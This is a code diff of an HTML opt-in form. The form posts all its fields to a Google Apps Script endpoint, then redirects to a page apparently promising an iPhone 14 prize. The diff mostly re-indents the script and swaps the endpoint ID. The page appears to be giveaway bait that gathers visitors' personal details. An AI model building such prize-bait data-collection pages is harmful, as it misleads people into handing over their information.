@@ -41,35 +41,35 @@
         }
     </style>
     <script>
-        function submitForm(event) {
-            event.preventDefault();
+    function submitForm(event) {
+        event.preventDefault();
 
-            const formData = new FormData(document.getElementById('optInForm'));
-            const data = {};
-            formData.forEach((value, key) => {
-                data[key] = value;
-            });
+        const formData = new FormData(document.getElementById('optInForm'));
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
 
-            fetch('https://script.google.com/macros/s/AKfycbzu3lVfNeYCMTOUP6Om6jfcp9ZPD_wCukJxqVeSfcUpC9ySXdirXtbjKrbAXZ-s9ukBYQ/exec', {
-                method: 'POST',
-                body: new URLSearchParams(data),
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'https://rileymarker.com/Winiphone14plusnow'; // Update with your URL
-                } else {
-                    alert('There was a problem with your submission.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
+        fetch('https://script.google.com/macros/s/AKfycbyeWMcComxII_ulEO5I-lbqROcJ-cpGQ3DbT9EEG-v7YLPS_rqid2aH02BEX-qfZRQ5/exec', {
+            method: 'POST',
+            body: new URLSearchParams(data),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
+        .then(response => {
+            if (response.ok) {
+                window.location.href = 'https://rileymarker.com/Winiphone14plusnow'; // Update with your URL
+            } else {
                 alert('There was a problem with your submission.');
-            });
-        }
-    </script>
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('There was a problem with your submission.');
+        });
+    }
+</script>
 </head>
 <body>
     <div class="form-container">
@@ -282,7 +282,6 @@
     <option value="Yemen">Yemen</option>
     <option value="Zambia">Zambia</option>
     <option value="Zimbabwe">Zimbabwe</option>
-
                 <!-- Continue the list of countries as needed -->
             </select><br>
             <button type="submit">Submit</button>
